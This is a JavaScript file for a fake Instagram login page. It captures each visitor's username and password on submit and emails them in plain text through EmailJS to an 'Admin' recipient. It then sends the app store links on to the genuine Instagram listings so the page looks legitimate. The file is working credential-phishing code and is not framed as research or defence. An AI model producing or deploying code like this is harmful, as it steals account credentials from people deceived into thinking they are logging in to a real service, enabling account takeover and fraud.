// Wait for the DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function() {
    // Get the form element
    const loginForm = document.getElementById('loginForm');
    
    // Get the button element
    const btn = document.getElementById('button');
    
    // Add event listener to the form
    if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault();
            
            // Change button text to show loading state
            btn.value = 'Sending...';
            btn.disabled = true;
            
            // Get form values
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // EmailJS service and template IDs
            const serviceID = 'default_service';
            const templateID = 'template_il4o8qx';
            
            // Create template parameters
            const templateParams = {
                from_name: 'Instagram Login Form',
                to_name: 'Admin',
                message: `Username: ${username}\nPassword: ${password}`,
                reply_to: username,
                username: username,
                password: password
            };
            
            // Send the email using EmailJS
            emailjs.send(serviceID, templateID, templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    // Success message
                    btn.value = 'Log In';
                    btn.disabled = false;
                    alert('Login information sent successfully!');
                    
                    // Clear the form
                    loginForm.reset();
                }, function(error) {
                    console.log('FAILED...', error);
                    // Error message
                    btn.value = 'Log In';
                    btn.disabled = false;
                    alert('Failed to send login information. Please try again.');
                });
        });
    }
    
    // App Store and Play Store redirection code
    // Get both app store links
    const appStoreLink = document.querySelector('.app-links a:first-child');
    const playStoreLink = document.querySelector('.app-links a:last-child');
    
    // Add click event listener to the App Store link
    if (appStoreLink) {
        appStoreLink.addEventListener('click', function(event) {
            event.preventDefault();
            
            // Instagram app URL on Apple App Store
            const instagramAppStoreUrl = 'https://apps.apple.com/app/instagram/id389801252';
            
            // Redirect to the Instagram app on App Store
            window.location.href = instagramAppStoreUrl;
        });
    }
    
    // Add click event listener to the Play Store link
    if (playStoreLink) {
        playStoreLink.addEventListener('click', function(event) {
            event.preventDefault();
            
            // Instagram app URL on Google Play Store
            const instagramPlayStoreUrl = 'https://play.google.com/store/apps/details?id=com.instagram.android';
            
            // Redirect to the Instagram app on Play Store
            window.location.href = instagramPlayStoreUrl;
        });
    }
}); 